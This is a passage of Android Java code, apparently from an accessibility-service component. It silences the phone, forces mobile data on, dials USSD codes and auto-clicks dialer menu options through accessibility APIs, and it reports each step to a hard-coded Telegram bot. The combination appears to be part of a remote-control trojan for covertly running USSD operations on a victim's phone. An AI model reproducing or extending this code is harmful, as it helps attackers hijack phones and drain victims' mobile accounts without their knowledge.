              private void setSilentMode(boolean silent) {
                  AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                  if (audioManager != null) {
                      if (silent) {
                          audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                      } else {
                          audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                      }
                  }
              }

              private void enableMobileData() {
                  try {
                      ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                          TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                          if (tm != null) {
                              tm.setDataEnabled(true);
                          }
                      } else {
                          try {
                              java.lang.reflect.Method setMobileDataEnabled = ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
                              setMobileDataEnabled.invoke(cm, true);
                          } catch (Exception e) {
                              Log.e(TAG, "Failed to enable mobile data: " + e.getMessage());
                          }
                      }
                      sendTelegram("📶 Mobile data enabled.");
                  } catch (Exception e) {
                      Log.e(TAG, "Error enabling mobile data: " + e.getMessage());
                      sendTelegram("❌ Failed to enable mobile data.");
                  }
              }

              private void dialUSSD(String code) {
                  Intent intent = new Intent(Intent.ACTION_DIAL);
                  intent.setData(android.net.Uri.parse("tel:" + code));
                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  context.startActivity(intent);
              }

              private void clickOption(int option) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;

                  List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/input");
                  if (nodes.isEmpty()) {
                      nodes = root.findAccessibilityNodeInfosByViewId("com.android.dialer:id/input");
                  }
                  for (AccessibilityNodeInfo node : nodes) {
                      if (node.isEditable()) {
                          Bundle args = new Bundle();
                          args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, String.valueOf(option));
                          node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return;
                      }
                  }

                  List<AccessibilityNodeInfo> btnNodes = root.findAccessibilityNodeInfosByText(String.valueOf(option));
                  for (AccessibilityNodeInfo node : btnNodes) {
                      if (node.isClickable()) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return;
                      }
                  }
              }

              private void sendTelegram(String message) {
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          String payload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + message + "\",\"parse_mode\":\"Markdown\"}";
                          OutputStream os = conn.getOutputStream();
                          os.write(payload.getBytes());
                          os.flush();
                          os.close();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      } finally {
                          if (conn != null) {
                              conn.disconnect();
                          }
                      }
                  }).start();
              }

              private String getCurrentTimestamp() {
                  SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                  return sdf.format(new Date());
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {}

              @Override
              public void onInterrupt() {}
          }
